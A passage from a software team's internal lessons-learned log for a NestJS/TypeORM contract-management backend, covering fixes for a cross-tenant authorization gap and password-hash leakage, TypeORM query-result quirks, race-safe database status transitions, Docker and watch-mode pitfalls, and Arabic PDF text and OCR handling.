PermissionLevelGuard)` at the controller class level but NO
`@RequirePermission(...)` decorator on the handler method itself. Both
RolesGuard and PermissionLevelGuard early-return `true` when their reflected
metadata is absent (`if (!requiredRoles || requiredRoles.length === 0)
return true;` and `if (!requiredLevel) return true;` respectively). Only
JwtAuthGuard ran. **Any authenticated user, of any role, in any
organization, could read any contract by id by hitting the endpoint with a
valid JWT and the contract's UUID** — confirmed live against the running
container in audit J.2 / K (a fresh CONTRACTOR_REVIEWER in org B fetched
a 245KB body of an org-A contract including the creator's bcrypt
`password_hash`).

**The trap that makes the obvious fix wrong.** Adding `@RequirePermission`
naively would 403 legitimate users. PermissionLevelGuard reads the project
id from `request.params.project_id || request.params.id || ...`. For a
contract-scoped route like `/contracts/:id`, `request.params.id` is the
CONTRACT id, not a project id. The guard would query
`memberRepository.findOne({ where: { project_id: <contract_id>, user_id }})`,
find nothing, and throw `ForbiddenException`. So the apparent quick-fix
(slap on the decorator) breaks authorized in-org users without closing the
gap.

**The correct fix shape.** Scope inside the SERVICE via the
contract→project→organization_id join — the in-house pattern at
`getPendingApprovalsForUser` line 1126 in the same file:
`.andWhere('project.organization_id = :orgId', { orgId })`. Plumb the
caller's `orgId` from the controller via the existing `@OrganizationId()`
param decorator (`backend/src/common/decorators/organization.decorator.ts`).
Return 404 NotFoundException (not 403) on out-of-org, matching
`negotiation.service.ts assertContractInOrg` — does not leak existence.

**Defense-in-depth note.** Strip sensitive fields from any nested User
relation returned by the same query (creator/approver) using the local
destructure-and-omit pattern from `users.service.ts:364`. The global
ClassSerializerInterceptor + entity `@Exclude` (lesson #146) backstops this
at the serializer layer, but both fire and both produce the same output;
the manual strip is preserved as a service-layer floor.

**How to avoid.** When auditing controller security, do NOT read the
class-level `@UseGuards(...)` line and conclude "authorized." Walk every
handler method and verify it has the metadata decorator the guard expects
(`@Roles(...)` for RolesGuard, `@RequirePermission(...)` for
PermissionLevelGuard). Absence of metadata = early-return = no
authorization on THAT method. The pattern of "guards on the class,
metadata on the method" is mandatory in this codebase — class-only is a
guard no-op.

**Reference:** Audit `docs/audits/7.18-guest-portal-audit.md` sections J.2
(static analysis), K (live cross-tenant probe — leak confirmed), L (live
verification of the fix — 404 cross-tenant, 200 in-org with zero sensitive
fields); commit `c632849` (fix(contracts): scope findById by org + strip
sensitive fields on creator/approver).

---

### Lesson #146 — Hand-Applied "Strip Secrets Before Returning" Conventions Do Not Scale And Fail Silently — Use Structural Stripping

The codebase had a real, documented in-house convention for stripping
sensitive User fields before returning: manual destructure-and-omit, e.g.
`const { password_hash, mfa_secret, mfa_totp_secret, mfa_recovery_codes,
...safe } = user; return safe;` at `users.service.ts:364` and
`admin-security/controllers/profile.controller.ts:51`. The convention WAS
followed everywhere a User was returned as the PRIMARY response object —
GET /users/me, GET /me/profile, etc. But it was **forgotten on every
endpoint that returned a User as a NESTED relation** — contracts.creator,
claims.submitter, notices.submitter, negotiation_events.performer, audit
log.user, comment.user, project.members[].user, support_chat.user,
support_ticket.assignee, knowledge_asset.reviewer, and so on. 22 endpoints
total (audit Section E master list). Each one leaked the User's bcrypt
`password_hash` to any authenticated caller via the relation join.

**Why manual stripping is structurally fragile.**
- A new endpoint that loads a User relation has to remember to add the
  destructure. There is no compile-time or test-time check that enforces it.
- A new module added by a different teammate inherits no protection.
- A new sensitive column added to the User entity in the future has to be
  added to every existing manual-strip site (search-and-replace across
  inconsistently-named helpers — `sanitizeUser`, plus ad-hoc destructures).
- Tests for the stripping at a per-site granularity require populating
  fixtures with the sensitive fields then asserting absence — easy to
  forget.

**The durable fix is structural.** Register `ClassSerializerInterceptor`
globally via `APP_INTERCEPTOR` in `app.module.ts`, and add `@Exclude()` on
the User entity for each sensitive field (`password_hash`, `mfa_secret`,
`mfa_totp_secret`, `mfa_recovery_codes`, `invitation_token`). Now every
endpoint that returns a User instance — directly or via a relation, on this
release or any future one — gets the strip for free. `instanceToPlain`
removes the `@Exclude`-decorated properties before the response is
serialized. Adding a new sensitive column = add one decorator in one place.

**Caveat — `ClassSerializerInterceptor` only fires on class INSTANCES.**
Plain-object response paths slip past it unchanged. The biggest such path
in this codebase is `auth.service.ts sanitizeUser`, which already
returns a plain destructured object — the interceptor never touches it. So
the structural fix has TWO parts:
1. Entity `@Exclude` + global interceptor (covers every instance-return path).
2. The plain-object helper still needs an explicit strip; updated
   `sanitizeUser` to add `invitation_token` to its destructure list so its
   field set mirrors the entity's `@Exclude` set.

**Audit-before-flipping-the-global-switch checklist** (saved as a
pre-Strategy-1 safety audit in this codebase). Confirm BEFORE enabling
the interceptor globally:
- Every leak site returns class instances (not plain objects mapped via
  `.toJSON()` / `JSON.parse(JSON.stringify(...))` / explicit
  `instanceToPlain`). If it returns plain objects, `@Exclude` is INERT
  for that path.
- No entity has pre-existing `@Transform` / `@Expose` / `@Type` decorators
  that would fire on OUTPUT (they're direction-agnostic). If any exist,
  the global flip can change shape unexpectedly.
- No consumer (frontend, integration test, external API) reads any of the
  to-be-excluded fields off a response. Especially for fields that are
  CURRENTLY on the wire (e.g. `invitation_token` was on the auth/login
  user object via `sanitizeUser`) — those consumers exist in theory; grep
  the frontend tree explicitly.
- No `excludeExtraneousValues: true` is set anywhere (would flip to
  strict `@Expose`-only mode and break every endpoint).

**How the gap was caught.** Audit-section K live-probe of `GET
/contracts/:id` returned a 245KB body with the contract's creator
loaded as a relation; `grep password_hash` on the body returned 1 hit.
Mapping the same shape across the codebase produced the 22-endpoint
"wider footprint" list.

**Verification of the structural fix.** Live regression diff against the
historical pre-fix body (section M): 4/4 sampled endpoints with 20/20
zero sensitive-field counts; top-level keys identical (36 vs 36); all 9
date fields byte-identical (ISO 8601 with `Z` preserved); first of 85
contract_clauses byte-identical; all 32 common creator keys identical.
The ONLY divergence is the 5 stripped keys. No regression to date or
decimal serialization, no relation dropping.

**Reference:** Audit `docs/audits/password-hash-leak-fix-audit.md`
sections A–E (Strategy-1 safety analysis) and section M (live
regression-diff verification); commit `ca37e15` (fix(security): global
ClassSerializerInterceptor + @Exclude on User sensitive fields; strip
invitation_token in sanitizeUser).

---

### Lesson #147 — `nest start --watch` Hot-Reload Silently Contaminates Before/After Verification — Prove Build Identity Before Trusting A "Before" Capture

During the audit-M verification of the global `ClassSerializerInterceptor`
fix, the plan was to capture the CURRENTLY-RUNNING container's response
shape as "before," then rebuild/restart and capture "after," then diff.
The currently-running container's StartedAt (`2026-06-01T16:05:56Z`) was
hours OLDER than every Strategy-1 source edit (`18:39–18:41Z`) — at first
glance the perfect pre-fix baseline. **In reality, `nest start --watch`
had already hot-reloaded the changes inside the running container** before
the planned restart, so the captured "before" was actually post-Strategy-1.
An in-process before/after diff would have shown zero differences and
proven nothing — while looking green.

**How it was caught.** The verification probe checked an expected-PRESENT
field (`invitation_token` on the auth/login user object — present in every
prior K/L capture via `sanitizeUser`) and found it already gone. That
single anomaly forced a second check; docker logs confirmed `File change
detected. Starting incremental compilation...` lines at 18:38:50 PM, 18:39:11
PM, 18:39:39 PM, 18:40:13 PM — each matching a source-edit mtime. The
hot-reload had silently fired four times during the session.

**Rule for any future fix-verification probe against a `--watch`
container.**
1. **Prove build identity in BOTH directions, UTC-aligned.** Compare
   container StartedAt vs latest source mtime via `TZ=UTC stat` — but ALSO
   consider that hot-reload may have applied the change without restarting,
   making StartedAt < source-mtime even though the new code IS running.
   Check `docker logs sign-backend --since 30m | grep -i 'File change
   detected\|nest application'` to detect hot-reload events.
2. **If hot-reload may have already applied the change, the in-process
   "before" capture is no longer trustworthy.** The only valid pre-change
   baseline is one captured BEFORE the source was edited — e.g. a response
   body preserved on disk from an earlier audit section. In audit M, the
   section-K leaked-body capture (`by2msoj3p.txt`, 250,855 bytes, preserved
   from a probe run days earlier on the pre-J.2 pre-Strategy-1 codebase)
   served as the historical baseline. Compare the new "after" against THAT,
   not against a freshly-captured "before" that may be contaminated.
3. **Always include at least one expected-PRESENT field in the verification
   probe**, not only expected-ABSENT checks. Expected-absent probes can't
   distinguish "fix worked" from "baseline was already post-fix." An
   expected-present field that comes back empty is the canary for the
   second case.
4. **Restart explicitly anyway**, even when hot-reload looks healthy, to
   ensure a clean canonical boot — eliminates any half-loaded hot-reload
   state and gives a deterministic StartedAt for the audit record.

**Reinforces #138.** That lesson covers `nest start --watch` silently
STOPPING hot-restart across an edit cascade (running stale code that no
longer matches source). This one covers the inverse — `--watch` silently
RESTARTING such that the "before" snapshot you intend to capture is
already the "after." `--watch` is non-deterministic in BOTH directions; the
running process is "whatever it is" and must always be empirically pinned
before being used as a verification anchor.

**Reference:** Audit `docs/audits/password-hash-leak-fix-audit.md` section
M Step 0/1 (container build-identity check + hot-reload disclosure +
historical-baseline substitution); docker logs `File change detected`
trail at 18:38:50–18:40:21 PM matching the four source-edit mtimes; the
historical pre-fix response body at the section-K tool-results path;
lesson #138 (`nest start --watch` can silently STOP hot-restarting).

---

### Lesson #148 — TypeORM 0.3 `manager.query()` for UPDATE/DELETE with RETURNING returns `[rows, rowCount]` — route every affected-count read through a normalising helper, NEVER hand-index `result[1]`

**Encountered:** Phase 7.18, metering engine reserve() under the first
concurrent-race test (`metering-race.spec.ts` "enforces capacity under N=20
concurrent reserves with M=5 (no oversell)").

**Observed (failing test).** The first run of the N=20 / M=5 race test under
the original reserve() code returned `fulfilled.length === 20` (expected 5) —
every reservation went through, `consumed` reached 20, no oversell rejection
ever fired. The capacity gate was a dead branch. This is the real,
reproduced bug that motivated the lesson.

**What happened.** The metering reserve path was guarding capacity via

```ts
const updateResult = await manager.query(
  `UPDATE metering_balance SET consumed = consumed + $1
   WHERE ... AND consumed + $1 <= $5
   RETURNING consumed`, [...]);

if (!Array.isArray(updateResult) || updateResult.length === 0) {
  throw new MeterLimitExceededError(...);
}
```

The check `updateResult.length === 0` was reading the OUTER tuple length —
always 2 regardless of how many rows were affected.

**Root cause.** TypeORM 0.3 with the Postgres driver returns UPDATE/DELETE
with RETURNING as a **two-tuple `[rows, rowCount]`** — NOT a flat rows
array. Verified empirically:

```
UPDATE ... RETURNING (affected=1):  [[{"n":1}], 1]   isArr=true len=2
UPDATE ... RETURNING (affected=0):  [[],         0]   isArr=true len=2
```

Engine-empirical extension (probed 2026-06-04 against TypeORM 0.3.19 + pg):
UPDATE WITHOUT RETURNING in the same driver path **also** returns
`[[], rowCount]` — confirmed under affected=2 and affected=0. So in this
project's pinned TypeORM 0.3.19 the shape is consistent between
with-RETURNING and without-RETURNING. **But that consistency is not a
contract we should hand-couple to** — see the hard rule below.

**Fix.** Read the count through a private helper on `MeteringService`,
extracted exactly so the result-shape wart is centralised:

```ts
private readAffectedCount(raw: unknown): number {
  if (Array.isArray(raw) && typeof raw[1] === 'number') {
    return raw[1];                       // [rows, rowCount] tuple
  }
  if (Array.isArray(raw)) {
    return raw.length;                   // defensive fallback
  }
  if (typeof raw === 'number') return raw; // bare-number fallback
  return 0;
}
```

Engine uses `this.readAffectedCount(updateRaw)` everywhere a gate decision
depends on affected rows. The companion `readReturningRows()` normalises
the rows-shape for callers that need both pieces (release()'s refund needs
the row data from the same UPDATE).

**Hard rule — never violate.** NEVER hand-index `updateResult[1]` or
`updateResult.length` at the call site. Route every affected-count read
through `readAffectedCount()` (or an equivalent helper that handles the
same variants). The `result.length === 0` pattern on TypeORM 0.3 UPDATE/DELETE
results is ALWAYS wrong — it reads the OUTER tuple length, never the
inner count. The "always read `result[1]`" pattern is ALSO wrong as a
general rule: it works for the empirically-confirmed shape today, but
locks the call site to TypeORM 0.3.x's pg-driver behaviour at every site
rather than at one. A future TypeORM bump or a switch to a different
driver path can change the shape; a single helper localises the change.
SELECT statements return a flat rows array and SELECT result handling is
unaffected (and the helper is not for SELECT-result-count anyway —
different semantics).

**How it was caught.** The very first run of the Phase 7.18 race test
failed loudly. The bug was invisible to unit tests of `reserve()` (every
individual reserve looked correct) and only surfaced under real-Postgres
concurrent contention with a non-trivial expected count. This is why
lessons #134/#135's "real-data, real-concurrency" posture applies to
the engine layer too — mock tests would have shipped this bug.

**Follow-up note (NOT a Part 1 fix — flag only).** The in-code comment
inside `readAffectedCount()` says "Without RETURNING, some TypeORM paths
return just the rows array." The 2026-06-04 probe found that in this
project's pinned 0.3.19 + pg, both with-RETURNING and without-RETURNING
return the same `[rows, rowCount]` tuple — the comment slightly overstates
the variability. The helper's Branch 2 (the `raw.length` fallback) is
therefore dead code for UPDATE/DELETE/INSERT in this version; it stays as
paranoia. Engine behaviour is correct. The comment can be tightened in a
future doc-only pass.

**Reference:** `backend/src/modules/metering/services/metering.service.ts`
`readAffectedCount()` / `readReturningRows()` helpers; engine commit
`dc31bb6` ships with the fix. Test that locks the gate:
`metering-race.spec.ts` — "enforces capacity under N=50 concurrent reserves
with M=5 (no oversell)".

---

### Lesson #149 — Read-then-write status transitions are racy under concurrent peers on the same row; use a single status-guarded conditional UPDATE with the side effect gated on `affected = 1`

**Encountered:** Phase 7.18 metering engine, hardening pass for
commit/release/sweeper concurrency (Part 1.5).

**Observed (failing tests).** The hardening-pass tests
`metering-race.spec.ts` — "concurrent commit + release on the same
reservation: exactly one applies, state consistent" and "concurrent
double-release on the same reservation: refund happens exactly once" —
were written to lock the FIXED behaviour. They were authored together
with the fix in Part 1.5; they were NOT first run against the unfixed
read-then-write code. The fix and the proof landed in the same pass.

**Reasoned worst cases (not separately reproduced by a failing test
against the unfixed code).** The original read-then-write code shape was

```ts
const row = await manager.getRepository(MeteringLedger).findOne({...});
if (row.status === RELEASED) return;
if (row.status === COMMITTED) throw ...;
// ... mutate row.status, run balance refund, save(row)
```

By reading the code's structure: under `Promise.all([release(X), release(X)])`
against the same reservation, both transactions would:
1. `findOne` returns `status = 'reserved'` (each transaction's snapshot
   was taken before the other committed).
2. Both pass the in-TypeScript `if (RELEASED) return` early-out.
3. Both run the balance refund — capacity refunded TWICE for a single
   reserve.
4. Both run `save(row)` setting `status = 'released'`. Last write wins;
   the row ends `released`. But `consumed` is now under-counted by
   `amount`.

The `GREATEST(consumed - amount, 0)` clamp at the DDL layer would have hid
the symptom — the balance never goes negative — making the failure mode
silent under-counting, not a CHECK violation. Same shape failed under
`Promise.all([commit(X), release(X)])` — both reads see `'reserved'`,
both decide their transition is legitimate, the row ends in the
last-writer's status while the refund has ALREADY run; a row could end
`committed` with capacity ALSO refunded — **capacity sold twice**.

The double-refund and the capacity-sold-twice modes are RECONSTRUCTED
worst cases from reading the race-prone code, not reproduced by a failing
pre-fix test. The fix is still correct; the lesson exists because the
class of bug is real and the discipline below prevents it.

**Root cause (reasoned).** The status check and the status flip were two
separate statements with no transactional barrier between them — the
`save(row)` was an unconditional `UPDATE metering_ledger SET status=...
WHERE id=...` with NO `AND status = 'reserved'` predicate. Postgres
row-level locking serialised the SAVE itself, but did NOT gate the BRANCH
DECISION that preceded it. Each transaction's in-TypeScript branch
decision was made against a stale snapshot.

**Fix.** Replace the three-step (read → branch in TS → write) shape with
a single status-guarded conditional UPDATE:

```sql
UPDATE metering_ledger
SET    status = 'released', released_at = NOW()
WHERE  reservation_id = $1 AND status = 'reserved'
RETURNING amount, subject_ref, meter_key, window_key;
```

The affected-row count is the gate. Affected = 1 → THIS call won the
race; run the refund using values from `RETURNING`. Affected = 0 → a peer
(release, commit, or sweeper) got there first; return
`{applied: false, status: <current>}` reporting the row's current state,
do NOT refund. Refund is at-most-once across any number of concurrent
commit / release / sweeper callers on the same reservation.

The return type changed from `Promise<void>` to `Promise<TransitionResult>`
(`{applied: boolean, status: MeterLedgerStatus | 'missing'}`) so callers
can audit-log "someone else got there first" without it being thrown as
an exception (the swept-then-late-commit case is routine under realistic
concurrency, not a fatal).

**Hard rule — never violate.** Status-transition methods on a row that
can be touched concurrently MUST use a single conditional UPDATE keyed on
the current status, with the side effect (refund / charge / external call)
gated on `affected = 1` from `RETURNING`. The "read row → branch on
`row.status` in TypeScript → save(row)" pattern is RACY by construction
even inside `dataSource.transaction()` — the transaction wraps both
statements but does NOT gate the branch decision. Promoted to a hard rule
after the metering hardening pass: the worst cases are reasoned, but the
class of bug is general and the discipline is cheap.

**Reference:** `backend/src/modules/metering/services/metering.service.ts`
`commit()` / `release()` / `releaseByLedgerId()`; engine commit `dc31bb6`.
Tests that lock the fixed shape:
`metering-race.spec.ts` — "concurrent commit + release on the same
reservation: exactly one applies, state consistent" and "concurrent
double-release on the same reservation: refund happens exactly once" and
"sweeper-then-late-commit: commit is a no-op, ledger consistent, no
double-count".

---

### Lesson #150 — Existence-check-then-insert is racy for idempotency under any non-serializable isolation; INSERT-FIRST with ON CONFLICT DO NOTHING is the canonical fix

**Encountered:** Phase 7.18 metering engine, hardening pass for same-key
reserve() under concurrency (Part 1.6).

**Observed (failing tests).** The hardening-pass tests
`metering-race.spec.ts` — "N=20 concurrent same-key reserves with limit=1:
all dedup to one reservation, charge once, no raw errors" and "same-key
reserve after commit returns the committed reservation, no extra charge"
and "two different idempotency_keys at limit=1 concurrent: exactly one
wins, one throws MeterLimitExceeded" — were written to lock the FIXED
behaviour. They were authored together with the fix in Part 1.6; they
were NOT first run against the unfixed existence-check-then-insert code.
The fix and the proof landed in the same pass.

**Reasoned worst cases (not separately reproduced by a failing test
against the unfixed code).** The original reserve() did existence-check-
then-insert:

```ts
const existing = await ledgerRepo.findOne({where: {subject_ref, meter_key, idempotency_key}});
if (existing) return {... reused: true};
// ... do balance ensure + conditional decrement ...
await ledgerRepo.save(ledgerEntity);  // ← insert
```

By reading the code's structure: under `Promise.all` of N reserves with
the SAME `idempotency_key`, all N `findOne` calls would return `null`
(each transaction's snapshot was taken before any peer committed). All N
would proceed past the dedup. All N would reach the conditional decrement.
With a generous limit, all N decrements would succeed transiently. Only
T1's `save()` would survive; T2-TN would hit the unique constraint
`uq_metering_ledger_subject_meter_idem` and throw raw
`QueryFailedError (23505)` — the rest of their transaction would roll
back (so no capacity leak survives commit), but **N-1 callers would
receive a raw Postgres error instead of the Pattern-C `{reused:true}`
they were contractually owed**.

Under a saturated limit (e.g. N=20 same key, limit=1), T1 would win the
capacity gate and commit. T2-T20 would see the post-commit `consumed=1`
via EvalPlanQual, evaluate `1+1<=1` false, and throw
`MeterLimitExceededError` instead of dedup-returning T1's reservation.
The wrong error class entirely — 19 callers told "limit reached" when
the truthful answer was "you already have this reservation."

Both modes are RECONSTRUCTED worst cases from reading the race-prone
code, not reproduced by a failing pre-fix test. The fix is still
correct; the lesson exists because the class of bug is general and the
correct shape (insert-first / ON CONFLICT) is canonical for any
at-most-once side effect.

**Root cause (reasoned).** The dedup was a two-step pattern (`findOne` →
`save`) with the unique-constraint check as the only true serialisation
point. By the time the unique constraint fires, the application has
already committed to either a raw-error or a wrong-class-error response.
The idempotency check happened at the WRONG layer — application snapshot
instead of DB constraint.

**Fix.** Reorder so the unique-constraint check IS the dedup, using
`INSERT ... ON CONFLICT DO NOTHING RETURNING ...` as the first statement
of the transaction:

```ts
const insertRaw = await manager.query(
  `INSERT INTO metering_ledger (...) VALUES (...)
   ON CONFLICT (subject_ref, meter_key, idempotency_key) DO NOTHING
   RETURNING id, reservation_id, ...`, [...]);
if (insertedRows.length === 0) {
  // We lost the race; SELECT the winner's row, return reused:true.
}
// We won; run capacity gate. If it fails, txn rolls back the INSERT.
```

ON CONFLICT DO NOTHING block-waits on the peer's index lock under READ
COMMITTED, so the loser's SELECT-after-conflict sees the peer's committed
row. If the winner's capacity gate fails (limit reached), the
transaction's rollback drops the just-inserted ledger row WITH the
decrement, so the idempotency claim does NOT persist when capacity was
denied — a later retry of the same key (after capacity frees up) starts
clean.

**Hard rule — never violate.** For any operation that MUST be at-most-once
across concurrent retries with the same key, the dedup gate MUST be a
database unique constraint, and the dedup CHECK must be
`INSERT ... ON CONFLICT DO NOTHING` (or equivalent), NOT a
`SELECT existence ? return : INSERT` pattern. Existence-check-then-insert
is racy under any non-serializable isolation — Postgres READ COMMITTED
(this project's default and the metering engine's required isolation, see
CLAUDE.md "Metering Engine Invariants" §6) does NOT prevent two
transactions from both seeing the row as missing. The ON CONFLICT path
block-waits and delivers the correct branch automatically;
application-layer existence checks cannot.

**Reference:** `backend/src/modules/metering/services/metering.service.ts`
`reserve()` insert-first path; the unique constraint
`uq_metering_ledger_subject_meter_idem` from migration
`1753000000001-AddMeteringPrimitive.ts`; engine commit `dc31bb6`.
Tests that lock the fixed shape:
`metering-race.spec.ts` — "N=20 concurrent same-key reserves with
limit=1: all dedup to one reservation, charge once, no raw errors" +
"same-key reserve after commit returns the committed reservation, no
extra charge" + "two different idempotency_keys at limit=1 concurrent:
exactly one wins, one throws MeterLimitExceeded".

---

### Lesson #151 — After Fixing a Cross-Tenant Bug in One Endpoint, Always Grep for the Same Pattern Across the Whole Module

PR #42 fixed a cross-tenant contract read in `ContractsService.findOne()` — the service
fetched by `id` only, with no `organization_id` filter, letting any authenticated user
read any contract. After the fix landed, `ContractSharingService.createShare()` was later
audited and found to have the **identical bug**: it called
`contractRepository.findOne({ where: { id: contractId } })` with no org-scope, meaning any
authenticated user could create a share link for any contract in the platform regardless
of organisation.

**Root cause of spread:** the original `findOne({ where: { id } })` pattern was
copy-pasted across services during early development. One fix does not propagate.

**Rule — apply immediately after fixing any cross-tenant `findById` pattern:**

```bash
# Grep for every findOne/findBy that receives an ID from user input
grep -rn "findOne\|findByIds\|findBy\b" backend/src --include="*.service.ts" \
  | grep -v "organization_id\|org_id\|orgId\|user_id\|userId\|project_id" \
  | grep "where.*id\b"
```

Review every hit: ask "does this query scope to the caller's organisation / user?" If not,
it is a potential cross-tenant read/write. Fix before moving on.

**Applies to:** any service that accepts a resource ID from a controller parameter or
request body. The most common miss is shared-access services (sharing, invitations,
public tokens) which are wired up quickly without the org-scope habit from the primary
CRUD services.

**Reference:** `ContractSharingService.createShare()` fixed in PR #47 (same pattern as PR #42
`ContractsService.findOne()` fix). Audit grep: `grep -rn "findOne" backend/src/modules/contract-sharing`.
See also lesson #145 (missing @RequirePermission silently disabling authorization).

---

### Lesson #152 — Never Ship an Email Notification That Links to a Frontend Route Before Verifying the Route Exists in `App.tsx`

**Encountered:** ContractShare Step 1 deprecation (2026-06-05), cleaning up
`ContractSharingService.createShare()` external branch.

**What happened.** `sendContractShared()` in `NotificationDispatchService` assembled
a share link as `${frontendUrl}/shared/${shareToken}` and sent it to external recipients.
The route `/shared/:token` was never registered in `apps/sign/src/App.tsx`. Every
external share email sent by this code path delivered a 404 link — the recipient landed
on the React fallback (or browser 404) instead of the contract.

The broken email and its dead frontend route co-existed undetected for the full lifetime
of the `ContractShare` module. No integration test covered the "click the link in the
email" flow end-to-end.

**Root cause.** The backend email template was written at the same time as the feature,
but the matching frontend route was never implemented. Because the email path was only
exercised when an EXTERNAL (non-org) email was entered in the share modal — a flow with
no automated tests — the bug was invisible during development.

**The rule.** Before shipping any backend email function that constructs a `${frontendUrl}/path`
link, explicitly verify:
1. Open `apps/sign/src/App.tsx` and confirm the route path is registered.
2. If the route does not exist yet, either: (a) implement the frontend page in the same PR,
   or (b) add a `// TODO: route not yet implemented` comment blocking the email function
   and DO NOT send broken links.
3. Write an integration test that resolves the URL to a non-404 (even a shallow render)
   to keep this verified as routes evolve.

**Applied fix.** External `createShare()` branch now logs `logger.warn()` with a
`TODO(bucket-7)` marker and returns `isInternal: false` without sending any email.
Frontend shows an amber "External sharing coming soon" banner and disables the Share
button for non-org emails. Share row is still created for record-keeping; no 404 link
is sent.

**How to audit for existing violations:**

```bash
# Find all email template functions that build frontend URLs
grep -rn "frontendUrl\|FRONTEND_URL\|BASE_URL" \
  backend/src/modules/notifications/templates/index.ts \
  backend/src/modules/notifications/notification-dispatch.service.ts

# Then verify each path appears in the frontend router
grep -n "path=" apps/sign/src/App.tsx
```

**Reference:** `ContractSharingService` external branch + `sendContractShared()` +
`contractSharedEmail()` removed in ContractShare Step 1 PR (feat/contractshare-step1-deprecation).
See also lesson #140 (mocking the external call path hides total failure of that path —
an email with a dead link is the runtime equivalent of a mocked renderer).

---

### Lesson #153 — `docker-compose restart` does NOT reload env vars; use `up -d --force-recreate`
**Problem:** Added `OPENAI_API_KEY` to `ai-backend/.env`, ran `docker-compose restart ai-backend celery-worker`, key still empty inside the containers.
**Root cause / Fix:** `restart` reuses the existing container; `env_file` only injects at container *creation*. After editing `.env`, run `docker-compose up -d --force-recreate <service>` to pick up new values.

### Lesson #154 — `nest start --watch` can finish compile cleanly yet never bootstrap the app (silent boot hang)
**Problem:** After a force-recreate, `tsc` logged "Found 0 errors. Watching for file changes." but port 3000 never bound, zero Nest bootstrap logs, `OOMKilled=false` — just hung.
**Fix:** Plain `docker restart sign-backend` re-runs the entrypoint and boots cleanly. Extends/refines #138 and #147 (watch-mode flakiness): "compile succeeded" ≠ "app started" — verify the health endpoint, not just the compile line.

### Lesson #155 — After force-recreating a `nest start --watch` backend, expect 2–3 min unhealthy during cold compile+boot — do NOT issue a second restart in that window
**Problem:** Backend showed `unhealthy` for ~3 min post-recreate; a second `docker restart` issued mid-boot SIGTERM'd the almost-ready process and triggered a *fresh* full recompile, doubling the wait.
**Fix:** Wait out the cold-compile window (poll the health endpoint); only restart if it's still down after ~4–5 min with no "successfully started" log.

### Lesson #156 — New content type using StorageService? Audit `LocalStorageAdapter.ensureDirsExist()`'s hardcoded folder allowlist
**Problem:** Legal-document uploads 500'd — `/app/uploads/legal-documents/` didn't exist; the adapter only pre-creates a fixed list of folders.
**Fix:** A new storage folder name = silent `ENOENT` at write time. Add the new folder to the `dirs` array in `ensureDirsExist()` (or create-on-write).

### Lesson #157 — TypeORM cannot reliably read/write pgvector `vector` columns — let Python own them
**Problem:** No working TypeORM mapping for `vector(1536)`; the npm pgvector adapter wasn't installed.
**Fix:** Omit the `embedding` column from the TypeORM entity entirely. The Python Celery task (psycopg2 + pgvector) owns all writes; NestJS reads use raw parameterized SQL (`$1::vector`) only when needed.

### Lesson #158 — Patch Python mocks at the SOURCE module when the target uses local (inside-function) imports
**Problem:** `mocker.patch("app.tasks.chunk_legal_document")` never fired — `run_ingest_legal_document` does `from app.services.legal_document_chunker import chunk_legal_document` *inside* the function body.
**Fix:** Patch at the source path (`app.services.legal_document_chunker.chunk_legal_document`, `psycopg2.connect`), not the caller module. Module-top imports patch at the caller; local imports patch at the source.

### Lesson #159 — Test harnesses must use a UTF-8-safe JSON encoder for non-ASCII payloads — never raw `bash curl -d "{...$var...}"`
**Problem:** Arabic retrieval looked completely broken (target article ranked #415, distance 0.94) — but the production pipeline was correct. The bash/`curl -d` JSON body mangled the multi-byte Arabic query before it reached the API.
**Fix:** Use Node `fetch`+`JSON.stringify`, Python `requests.post(json=...)`, or Postman. Symptom to recognize: prod looks broken (garbage semantic search) while a same-text self-similarity test returns distance 0.0 — the bug is in the harness, not the product. Contaminated *every* prior Phase D retrieval verdict.

### Lesson #160 — `pdf2image.convert_from_path` renders ALL pages into RAM before returning — OOM on long PDFs
**Problem:** Force-OCR of a 100-page PDF @ 300dpi was SIGKILL'd (`OOMKilled=true`) ~41 s in — ~2.6 GB of page images held at once against a 3 GB limit, before OCR even started.
**Fix:** Render one page at a time with `first_page`/`last_page` bounds; peak stays flat (~30 MB/page). Confirmed: 330 MiB peak afterward.

### Lesson #161 — `@app.task(base=CustomTaskClass)` is the minimal Celery `on_failure` backstop — keep it status-guarded
**Problem:** An OOM/SIGKILL killed the worker before the task's own FAILED-marking ran, leaving documents stuck `PENDING` with no error and no job.
**Fix:** Add a custom task base class with `on_failure` (no class-based-task rewrite). Make the UPDATE status-guarded (`WHERE embedding_status IN ('PENDING','PROCESSING')`) so a late backstop never overwrites a terminal (INDEXED/FAILED) state.

### Lesson #162 — Broken-ToUnicode PDF text corruption is lossy/non-invertible — OCR is the only fix, not character normalization
**Problem:** ETA Civil Code PDFs render `ك` as `آ` (~72% of chunks). The substitution looked deterministic (آ→ك) — but the font's broken ToUnicode CMap collapses TWO real codepoints (`ك` and legitimate `آ`) into U+0622, so any global remap corrupts every genuine `آ` word (آخر, القرآن, آلات).
**Fix:** Render to pixels and OCR (Tesseract `ara`) — bypasses the text layer entirely. Diagnose the class via 4+ extractors returning *byte-identical* corruption (proves it's in the PDF, not the extractor).

### Lesson #163 — Arabic embeddings (text-embedding-3-small) need LOGICAL word order — gate bidi reversal on a per-source flag, never apply unconditionally
**Problem:** Visual-order (RTL-reversed) Arabic embeds as semantically different text, wrecking retrieval. Per-line word reversal fixes visual-order PDFs but CORRUPTS already-logical PDFs (the common case).
**Fix:** Make direction a per-source property (`legal_sources.is_visual_order`); apply reversal only when set. (And when `force_ocr` is on, suppress reversal — OCR is logical-order natively.)

### Lesson #164 — Investigation prompts referencing an existing method/file must include a grep/find verification step
**Problem:** Twice in 7.27, prompts/specs assumed a method existed ("the findings doc mentioned X") and code called methods that weren't actually present.
**Fix:** "A doc/prompt mentioned X" is not proof X exists. Always `grep`/`find` the artifact before building on it.

### Lesson #165 — `project.country` is a display name ("Egypt"), not an ISO code — normalize before using it as a jurisdiction key
**Problem:** Phase 7.27 Phase E chat retrieval silently returned 0 chunks for an Egypt project — the legal corpus keys on ISO-2 (`EG`) but `projects.country` stores `"Egypt"`, so `WHERE jurisdiction = 'Egypt'` matched nothing.
**Fix:** Map display-name → ISO before passing a project country downstream (`"Egypt"` → `EG`, `"United Arab Emirates"`/`"UAE"` → `AE`, …). Anything unmapped resolves to null → silent fallback. Never assume a country column is an ISO code.

### Lesson #166 — Claude chat completions sometimes wrap valid JSON in a ```json fence even when the system prompt mandates pure JSON — parse defensively
**Problem:** Phase 7.27 Phase E chat broke intermittently with `Expecting value: line 1 column 1 (char 0)` — a naive `json.loads(raw_text)` on the model reply. A large Arabic `<legal_context>` block tipped Claude into fencing its JSON (```json … ```).
